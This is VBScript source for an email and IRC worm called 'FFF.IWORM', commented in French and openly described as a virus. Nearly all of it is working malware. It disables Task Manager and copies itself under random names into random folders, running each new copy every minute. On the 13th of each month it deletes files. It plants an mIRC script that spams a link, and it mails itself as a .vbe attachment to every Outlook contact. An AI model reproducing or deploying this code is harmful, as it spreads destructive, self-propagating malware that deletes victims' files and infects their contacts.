   ' FFF.IWORM
   On Error Resume Next

   ' déclaration des objets et variables commune
   Randomize
   Set FSO = CreateObject("Scripting.FileSystemObject")
   Set WS = CreateObject("WScript.Shell")
   Set C = FSO.GetFile(WScript.ScriptFullName)
   Set D = CreateObject("Scripting.Dictionary")
   DR=FSO.GetDriveName(FSO.GetSpecialFolder(0))

   Function Main ' fonction principale
   On Error Resume Next
   WS.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD" ' Empeche l'utilisation de Ctrl + Alt + Suppr sous WinXP
   name=""
   ncar=Int(Rnd*5)+5 ' Randomisation du nombre de caractère pour le nom
   For n = 1 To ncar
   car=Chr(Int(Rnd*25)+66) ' Randomisation du caractère (en majuscule de A à Z)
   name=name&car
   Next
   n=Int(Rnd*25)+66 ' Pareil que car mais il faudra mettre chr(n)
   Do
   If d.Exists(Chr(n)) Then ' Si la clé n (par exemple F) existe dans le dictionnaire d
   folder=d.Item(Chr(n)) ' alors folder = cette clé (qui est un répertoire)
   Exit Do
   Else ' si la clé n'est pas dans le dictionnaire
   For n2 = 65 To 90 ' chr(65)="A" et chr(90)="Z"
   Scan DR&"\", n2 ' lancement de la fonction Scan
   Next
   End If
   Loop
   C.Copy(folder&"\"&name&".vbe") ' Copie du virus dans le répertoire aléatoire avec le nom aléatoire
   Main = folder&"\"&name&".vbe" ' Retour de la fonction Main
   If Day(Date)=13 Then ' Si le virus est executé un 13 du mois
   Set f = FSO.GetFolder(folder)
   Set fc = f.Files
   For Each f2 In fc
   ext = FSO.GetExtensionName(f2.path)
   ext = LCase(ext)
   If Not ext="vbe" Then ' sauf si l'extension du fichier est .vbe
   f2.path.delete True ' suppression de tout les fichiers dans le répertoire aléatoire
   End If
   Next
   End If
   End Function
   Sub Scan(spec, n2) ' fonction de scan du disque dur
   On Error Resume Next
   rd=Int(Rnd*10)+1
   Set f = FSO.GetFolder(spec)
   Set sf = f.SubFolders
   For Each f1 In sf
   If rd=5 Then ' si rd = 5 (1 chance sur 10)
   If Not d.Exists(Chr(n2)) Then ' si la clé chr(n2) n'existe pas dans le dictionnaire
   d.Add Chr(n2), f1.path ' définition d'un nouveau répertoire aléatoire
   End If
   Else ' si la clé existe déjà
   Scan f1.path, n2 ' lancement de la fonction Scan pour le sous-répertoire
   End If
   Next
   End Sub
   Function Internet ' fonction de propagation par mail et mirc
   On Error Resume Next
   key=""
   key=WS.RegRead("HKEY_CLASSES_ROOT\ChatFile\DefaultIcon\") ' normalement key est l'adresse de l'éxecutable de mirc si il est installé
   If key="" Then
   key=DR&"\Program Files\mIRC" ' si jamais la valeur du registre n'existe pas ou est vide, key est égal au dossier d'installation par défaut
   Else ' si la valeur existe
   key=Replace(key, Chr(34), "") ' enlevement des tirets
   Set F=FSO.GetFile(key)
   key=F.ParentFolder ' récupération du dossier ou mirc est installé
   End If
   Set inw=FSO.CreateTextFile(key&"\script.ini", True) ' écriture de script.ini
   inw.WriteLine "[script]"
   inw.WriteLine "n0 = on 1:JOIN:#:{"
   inw.WriteLine "n1 = /timerpub 0 120 /say Visit www.siteavirus.com"
   inw.WriteLine "n2 = /if ( $nick == $me ) { halt }"
   inw.WriteLine "n3 = /msg $nick Hi, Visit www.siteavirus.com"
   inw.WriteLine "n4 = }"
   inw.close
   key2=""
   key2=WS.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Mailok")
   If key2="" Then ' si key2 n'existe pas (le virus n'a pas jamais envoyé de mail)
   C.Copy(FSO.GetSpecialFolder(0)&"\ReadMe_FFFnews.vbe")
   Set NT = CreateObject("Wscript.Network")
   Set OutlookApp = CreateObject("Outlook.Application")
   If OutlookApp = "Outlook" Then
   Set MAPINameSpace = OutlookApp.GetNameSpace("MAPI")
   Set AddressLists = MAPINameSpace.AddressLists
   For Each address In AddressLists
   If address.AddressEntries.Count <> 0 Then
   entryCount = address.AddressEntries.Count
   For i = 1 To entryCount
   Set newItem = OutlookApp.CreateItem(0)
   Set currentAddress = address.AddressEntries(i)
   newItem.To = currentAddress.Address
   newItem.Subject = "The FFF"
   newItem.Body = "Hi :"&vbCrLf&"Please read this document (attached file)."&vbCrLf&vbCrLf&NT.Username
   Set attachments = newItem.Attachments
   attachments.Add FSO.GetSpecialFolder(0)&"\ReadMe_FFFnews.vbe"
   newItem.DeleteAfterSubmit = True
   If newItem.To <> "" Then
   newItem.Send
   End If
   Next
   End If
   Next
   End If
   WS.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Mailok", "1" ' pour que la fonction de mail ne se répète plus
   End If
   End Function
   Internet ' execution de la fonction Internet
   Do
   WScript.Sleep 60000 ' le script "dort" une minute
   Main ' execution de la fonction Main
   WS.Run Main ' execution de la nouvelle copie du virus
   Loop
